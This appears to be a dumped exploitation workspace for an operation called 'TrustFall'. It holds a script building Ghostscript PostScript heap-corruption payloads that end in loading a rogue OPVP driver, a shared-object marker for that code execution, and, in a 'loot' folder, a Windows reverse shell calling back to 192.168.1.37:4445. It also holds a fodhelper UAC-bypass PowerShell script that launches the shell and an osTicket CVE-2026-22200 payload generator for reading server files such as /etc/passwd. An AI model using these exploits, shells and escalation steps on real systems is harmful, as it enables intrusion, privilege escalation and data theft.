            printf '.putdeviceparamsonly pop pop /putok true def } stopped { /puterr $error /errorname get def } if clear\n'
            printf 'putok { df (closed-copy-params: ok\\n) writestring } '
            printf '{ df (closed-copy-params: ) writestring df puterr 64 string cvs writestring df (\\n) writestring } ifelse\n'
            printf '/setok false def /seterr /none def { opdev setdevice /setok true def } stopped '
            printf '{ /seterr $error /errorname get def } if clear\n'
            printf 'setok { df (real-open: ok\\n) writestring } '
            printf '{ df (real-open: ) writestring df seterr 64 string cvs writestring df (\\n) writestring } ifelse df closefile\n'
            printf 'showpage\n%%%%EOF\n'
            exit 0
        fi
        if [[ "$mode" == leak ]]; then
            printf '{\n'
            for k in {-8..8}; do
                candidate=$((victim_delta + k * 32768))
                if (( candidate < 0 )); then
                    candidate_cid=$(( (4294967296 + candidate) / 2 ))
                else
                    candidate_cid=$(( candidate / 2 ))
                fi
                for n in 0 1 2 3; do
                    printf 'w%s %s poke\n' "$n" "$((candidate_cid + n))"
                done
                printf '/hit -1 def 0 1 2047 { /j exch def victim j get dup 0 get 127 eq '
                printf '{ pop /hit j def exit } { pop } ifelse } for\n'
                printf 'hit -1 ne { '
                printf '/lf (/tmp/trustfall-forge-leak) (w) file def lf victim hit get writestring lf closefile '
                printf '/mf (/tmp/trustfall-forge-index) (w) file def mf (%s ) writestring ' "$candidate"
                printf 'mf hit 32 string cvs writestring mf closefile stop } if\n'
            done
            printf '} stopped pop\n'
        else
            if (( victim_delta < 0 )); then
                victim_cid=$(( (4294967296 + victim_delta) / 2 ))
            else
                victim_cid=$(( victim_delta / 2 ))
            fi
            for n in 0 1 2 3; do
                printf 'w%s %s poke\n' "$n" "$((victim_cid + n))"
            done
            if [[ "$mode" == dump ]]; then
                printf '/lf (/tmp/trustfall-forge-dump) (w) file def '
                printf 'lf victim %s get writestring lf closefile\n' "$victim_index"
                printf 'showpage\n'
                printf '%%%%EOF\n'
                exit 0
            fi
            if [[ "$mode" == scan ]]; then
                for n in 0 1 2 3; do
                    cid=$((victim_cid + n))
                    index=$((cid / 256))
                    slot=$((cid % 256))
                    printf '/pa%s 256 array def 0 1 255 { pa%s exch 0 put } for pa%s %s 999 put\n' "$n" "$n" "$n" "$slot"
                    printf '/pd%s 1 dict def pd%s %s pa%s put /pt%s 1 dict def\n' "$n" "$n" "$index" "$n" "$n"
                    printf '/poke%s { pt%s 999 3 -1 roll put pd%s pt%s [] 2 [window] fillop } def\n' "$n" "$n" "$n" "$n"
                done
                printf '/sw { dup 256 mod 256 mul exch 256 idiv add } def\n'
                printf '/p0 w0 sw def /p1 w1 sw def /p2 w2 sw def /p3 w3 sw def\n'
                printf '/of (/tmp/trustfall-core-candidates) (w) file def\n'
                # The core context is an early allocator object.  Start the
                # supplied pointer at heap+0x2000c and cover the next 256 KiB;
                # this keeps the remote thumbnail request comfortably short.
                printf '0 1 16383 { /iter exch def /s victim %s get def /match true def ' "$victim_index"
                # Point the scan at path_control_active itself (heap offset
                # 0x2000c modulo the scan base).  Avoid assumptions about
                # CPSI/scanconverter/UEL and validate the following
                # gs_path_control_set_t instead: active=1, a small
                # power-of-two capacity, and 0 < num <= max.
                printf 's 0 get 1 ne { /match false def } if '
                printf '1 1 3 { s exch get 0 ne { /match false def } if } for '
                printf '/mx s 4 get s 5 get 256 mul add def '
                printf 's 6 get 0 ne s 7 get 0 ne or { /match false def } if '
                printf 'mx 4 eq mx 8 eq or mx 16 eq or mx 32 eq or mx 64 eq or not { /match false def } if '
                printf '/nu s 8 get s 9 get 256 mul add def '
                printf 's 10 get 0 ne s 11 get 0 ne or { /match false def } if '
                printf 'nu 0 le nu mx gt or { /match false def } if '
                printf 'match { of iter 16 mul 131084 add 32 string cvs writestring of ( ) writestring } if '
                printf '/p0 p0 16 add def p0 65535 gt { /p0 p0 65536 sub def /p1 p1 1 add def '
                printf 'p1 65535 gt { /p1 0 def /p2 p2 1 add def p2 sw poke2 } if p1 sw poke1 } if p0 sw poke0 } for\n'
                printf 'of closefile showpage\n'
                printf '%%%%EOF\n'
                exit 0
            fi
            # The first ref in victim now points at path_control_active.  A
            # CID 0 write through it clears the low two bytes of the integer.
            printf '/a0 256 array def 0 1 255 { a0 exch 0 put } for a0 0 999 put\n'
            printf '/d0 1 dict def d0 0 a0 put /t0 1 dict def t0 999 0 put\n'
            printf 'd0 t0 [] 2 victim %s 1 getinterval fillop\n' "$victim_index"
            printf 'victim %s window put\n' "$victim_index"
            printf '/df (/tmp/trustfall-opvp-diag) (w) file def '
            printf 'df (flag-after: ) writestring /fs victim %s get def ' "$victim_index"
            printf '0 1 15 { fs exch get 8 string cvs df exch writestring df ( ) writestring } for df (\\n) writestring\n'
            # A deliberately failed open leaves finddevice's fresh mutable
            # copy closed in devicedict slot 1.  Point it at the real driver.
            printf 'df (strategy: failed-open-then-real-driver\\n) writestring df closefile\n'
            printf '/df (/tmp/trustfall-opvp-diag2) (w) file def\n'
            printf '/awayok false def /awayerr /none def { origdev setdevice /awayok true def } stopped '
            printf '{ /awayerr $error /errorname get def } if clear\n'
            printf 'awayok { df (switch-away: ok\\n) writestring } '
            printf '{ df (switch-away: ) writestring df awayerr 64 string cvs writestring df (\\n) writestring } ifelse\n'
            printf '/failerr /none def { << /OutputDevice /opvp /Driver (/tmp/trustfall-no-such-driver.so) >> setpagedevice } '
            printf 'stopped { /failerr $error /errorname get def } if clear\n'
            printf 'df (staging-open: ) writestring df failerr 64 string cvs writestring df (\\n) writestring\n'
            printf '/opdev devicedict /opvp get 1 get def\n'
            printf '/putok false def /puterr /none def { opdev null true mark /Driver (/tmp/trustfall-cidmap-opvp.so) '
            printf '.putdeviceparamsonly pop pop /putok true def } stopped { /puterr $error /errorname get def } if clear\n'
            printf 'putok { df (closed-copy-params: ok\\n) writestring } '
            printf '{ df (closed-copy-params: ) writestring df puterr 64 string cvs writestring df (\\n) writestring } ifelse\n'
            printf '/setok false def /seterr /none def { opdev setdevice /setok true def } stopped '
            printf '{ /seterr $error /errorname get def } if clear\n'
            printf 'setok { df (real-open: ok\\n) writestring } '
            printf '{ df (real-open: ) writestring df seterr 64 string cvs writestring df (\\n) writestring } ifelse df closefile\n'
        fi
        printf 'showpage\n'
    fi
    printf '%%%%EOF\n'
} > "$payload"

printf 'Built %s (%s), victim pointer delta %s, index %s, library %s bytes\n' \
    "$payload" "$mode" "$victim_delta" "$victim_index" "$(stat -c %s "$library")"
```


## probes/cidmap_opvp_marker.c

```c
/* Minimal dependency-free x86-64 marker for the TrustFall OPVP RCE proof. */

#define AT_FDCWD -100
#define O_WRONLY 1
#define O_CREAT 64
#define O_TRUNC 512

#ifndef MARKER_PATH
#define MARKER_PATH "/tmp/trustfall-cidmap-opvp-rce"
#endif

static long syscall1(long number, long arg1)
{
    long result;
    __asm__ volatile (
        "syscall"
        : "=a" (result)
        : "a" (number), "D" (arg1)
        : "rcx", "r11", "memory"
    );
    return result;
}

static long syscall3(long number, long arg1, long arg2, long arg3)
{
    long result;
    __asm__ volatile (
        "syscall"
        : "=a" (result)
        : "a" (number), "D" (arg1), "S" (arg2), "d" (arg3)
        : "rcx", "r11", "memory"
    );
    return result;
}

static long syscall4(long number, long arg1, long arg2, long arg3, long arg4)
{
    register long r10 __asm__("r10") = arg4;
    long result;
    __asm__ volatile (
        "syscall"
        : "=a" (result)
        : "a" (number), "D" (arg1), "S" (arg2), "d" (arg3), "r" (r10)
        : "rcx", "r11", "memory"
    );
    return result;
}

static unsigned long string_length(const char *text)
{
    const char *cursor = text;
    while (*cursor)
        cursor++;
    return (unsigned long)(cursor - text);
}

static void write_marker(const char *path, const char *text)
{
    long fd = syscall4(257, AT_FDCWD, (long)path,
                       O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0)
        return;
    syscall3(1, fd, (long)text, (long)string_length(text));
    syscall1(3, fd);
}

__attribute__((constructor))
static void loaded(void)
{
    write_marker(
        MARKER_PATH,
        "CIDMap underwrite unlocked OPVP and its dlopen constructor ran.\n"
    );
}

int opvpErrorNo;

int opvpOpenPrinter(int output_fd, const char *model, const int api_version[2],
                    void **api_procs)
{
    (void)output_fd;
    (void)model;
    (void)api_version;
    (void)api_procs;
    opvpErrorNo = 1;
    return -1;
}
```


## loot/trustfall-emma-rdp/diagnostic4445.c

```c
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>

int WINAPI WinMain(HINSTANCE instance, HINSTANCE previous, LPSTR command_line, int show) {
    WSADATA data;
    struct sockaddr_in endpoint;
    STARTUPINFOA startup;
    PROCESS_INFORMATION process;
    SOCKET channel;

    (void)instance;
    (void)previous;
    (void)command_line;
    (void)show;

    if (WSAStartup(MAKEWORD(2, 2), &data) != 0) {
        return 1;
    }

    ZeroMemory(&endpoint, sizeof(endpoint));
    endpoint.sin_family = AF_INET;
    endpoint.sin_port = htons(4445);
    endpoint.sin_addr.s_addr = inet_addr("192.168.1.37");

    for (;;) {
        channel = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (channel == INVALID_SOCKET) {
            Sleep(5000);
            continue;
        }

        if (connect(channel, (struct sockaddr *)&endpoint, sizeof(endpoint)) == SOCKET_ERROR) {
            closesocket(channel);
            Sleep(5000);
            continue;
        }

        SetHandleInformation((HANDLE)channel, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
        ZeroMemory(&startup, sizeof(startup));
        ZeroMemory(&process, sizeof(process));
        startup.cb = sizeof(startup);
        startup.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        startup.wShowWindow = SW_HIDE;
        startup.hStdInput = (HANDLE)channel;
        startup.hStdOutput = (HANDLE)channel;
        startup.hStdError = (HANDLE)channel;

        char shell[] = "C:\\Windows\\System32\\cmd.exe";
        if (CreateProcessA(NULL, shell, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                           NULL, NULL, &startup, &process)) {
            CloseHandle(process.hThread);
            WaitForSingleObject(process.hProcess, INFINITE);
            CloseHandle(process.hProcess);
        }

        closesocket(channel);
        Sleep(5000);
    }
}
```


## loot/trustfall-emma-rdp/task01-lpe.ps1

```powershell
$ErrorActionPreference = 'SilentlyContinue'
$marker = 'C:\Users\Public\task01-lpe-fired.txt'

if (Test-Path $marker) {
    exit
}

whoami.exe /all | Out-File -Encoding ascii 'C:\Users\Public\task01-context.txt'
Set-Content -Encoding ascii -Path $marker -Value (Get-Date -Format o)

$handler = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'
New-Item -Path $handler -Force | Out-Null
New-ItemProperty -Path $handler -Name 'DelegateExecute' -Value '' -PropertyType String -Force | Out-Null
Set-Item -Path $handler -Value 'C:\Users\Public\diagnostic4445.exe'

Start-Process 'C:\Windows\System32\fodhelper.exe'
Start-Sleep -Seconds 10
Remove-Item 'HKCU:\Software\Classes\ms-settings' -Recurse -Force
```


## /tmp/CVE-2026-22200/osticket_ticket_payload_gen.py

Upstream Horizon3.ai source from commit [`06a50ca2b192ee91d1cc6cb60a3b4553392c2654`](https://github.com/horizon3ai/CVE-2026-22200/commit/06a50ca2b192ee91d1cc6cb60a3b4553392c2654).

```python
# Original idea of formatting files as bitmap images taken from Hitcon 2022 web2pdf challenge: https://blog.splitline.tw/hitcon-ctf-2022/#%F0%9F%93%83-web2pdf-web
# Code based on: https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
#
# Example usage:
# python osticket_ticket_payload_gen.py -f /etc/passwd include/ost-config.php /proc/self/maps,b64zlib
# python osticket_ticket_payload_gen.py -f /usr/lib/x86_64-linux-gnu/libc.so.6,b64zlib -r
# python osticket_ticket_payload_gen.py -p cnext_payload -r
import base64, sys, string
from urllib.parse import quote
from argparse import ArgumentParser

ICONV_MAPPINGS = {
    "61": "convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE",
    "59": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361",
    "66": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213",
    "50": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB",
    "68": "convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE",
    "57": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936",
    "6f": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE",
    "6a": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16",
    "32": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921",
    "35": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE",
    "69": "convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000",
    "56": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB",
    "51": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2",
    "58": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932",
    "67": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8",
    "34": "convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE",
    "5a": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16",
    "33": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE",
    "4e": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4",
    "4b": "convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE",
    "42": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000",
    "45": "convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT",
    "73": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90",
    "74": "convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS",
    "4c": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC",
    "4d": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T",
    "75": "convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61",
    "72": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101",
    "44": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213",
    "2f": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4",
    "43": "convert.iconv.CN.ISO2022KR",
    "6b": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2",
    "38": "convert.iconv.JS.UTF16|convert.iconv.L6.UTF-16",
    "6e": "convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61",
    "36": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2",
    "31": "convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4",
    "65": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937",
    "62": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE",
    "54": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103",
    "53": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS",
    "30": "convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.iconv.ISO6937.EUC-JP-MS|convert.iconv.EUCKR.UCS-4LE",
    "37": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4",
    "6d": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949",
    "6c": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE",
    "39": "convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB",
    "52": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4",
    "55": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943",
    "63": "convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2",
    "64": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5",
    "46": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB",
    "79": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT",
    "41": "convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213",
    "77": "convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE",
    "48": "convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213",
    "70": "convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4",
    "4a": "convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4",
    "4f": "convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775",
    "71": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2",
    "76": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932",
    "49": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213",
    "47": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90",
    "78": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS",
    "7a": "convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937"
}

parser = ArgumentParser(description="Generate osTicket ticket payload to retrieve provided file paths, or wrap custom PHP payload. Set -r flag if the payload will be used to reply to an existing ticket.")
parser.add_argument('-f', '--files', nargs='*', help='Zero or more file paths to fetch. Add ,b64 or ,b64zlib to add conversions to file, e.g. /etc/passwd,b64lib', required=False)
parser.add_argument('-p', '--payload', help='file path containing PHP payload', required=False)
parser.add_argument('-r', '--reply', action='store_true', help='Generate payload for ticket reply (vs ticket creation)')
args = parser.parse_args()

PAYLOAD_FILE = args.payload
FILE_PATHS = args.files

if not PAYLOAD_FILE and not FILE_PATHS:
    print('no file paths or payload file provided')
    sys.exit(1)


payloads = []
if PAYLOAD_FILE:
    payloads.append(open(PAYLOAD_FILE, 'r').read())

if FILE_PATHS:
    for f in FILE_PATHS:

        # Depending on the file you may get slightly different results depending on the encoding, especially towards the end of the file
        # Note there appears to limit to the size of any individual BMP file you can pull back of roughly ~45K. File is truncated after that limit.
        if len(f.split(',', 1)) > 1:
            file_to_use, encoding = f.split(',', 1)
            if encoding not in ['plain', 'b64', 'b64zlib']:
                print(f'Invalid encoding: {encoding}, defaulting to plain text retrieval')
                encoding = 'plain'
        else:
            file_to_use = f
            encoding = 'plain'

        width, height = 15000, 1
        payload = b'BM:\x00\x00\x00\x00\x00\x00\x006\x00\x00\x00(\x00\x00\x00' + \
            width.to_bytes(4, 'little') + \
            height.to_bytes(4, 'little') + \
            b'\x01\x00\x18\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        base64_payload = base64.b64encode(payload).decode()
        filters = "convert.iconv.UTF8.CSISO2022KR|"
        filters += "convert.base64-encode|"
        # make sure to get rid of any equal signs in both the string we just generated and the rest of the file
        filters += "convert.iconv.UTF8.UTF7|"
        
        for c in base64_payload[::-1]:
            filters += ICONV_MAPPINGS[(str(hex(ord(c)))).replace("0x","")] + "|"
            filters += "convert.base64-decode|"
            filters += "convert.base64-encode|"
            filters += "convert.iconv.UTF8.UTF7|"

        filters += "convert.base64-decode"

        if encoding == 'b64' or encoding == 'b64zlib':
            filters = "convert.base64-encode|" + filters
            if encoding == 'b64zlib':
                filters = "zlib.deflate|" + filters

        payloads.append(f"php://filter/{filters}/resource={file_to_use}")

# osTicket specific logic

# url encode certain characters to bypass various checks. in particular it's important that php:// needs to be turned into php%3a//
# the path will get url decoded in the mpdf version included in osTicket
#
# Also Noticed that file paths with capital letters get turned into lowercase somewhere in the PDF processing.
# To work around this, we also urlencode capital letters
def quote_with_forced_uppercase(input_string: str) -> str:
    safe_chars = string.ascii_lowercase + string.digits + '_.-~'

    encoded_parts = []
    for char in input_string:
        if 'A' <= char <= 'Z':
            encoded_parts.append(f"%{ord(char):X}")
        elif char in safe_chars:
            encoded_parts.append(char)
        else:
            encoded_parts.append(quote(char))

    return "".join(encoded_parts)

# The SEP sequence is part of the payload and used to bypass some input validation/sanitization in osTicket and htmLawed.
# The separator is different when creating a new ticket vs replying to an existing ticket
#
# This exploit was tested specifically against osticket version 1.18.2 should work with other recent versions.
# Very old versions of osTicket circa 2020 and before actually don't seem to need any special separator (this has not been tested)
SEP = "&#38;&#35;&#51;&#52;" if args.reply else "&#34"

final_payload = '<ul>'
for p in payloads:
    final_payload += f'<li style="list-style-image:url{SEP}({quote_with_forced_uppercase(p)})">listitem</li>\n'
final_payload += '</ul>'

print(final_payload)
```

{% endraw %}
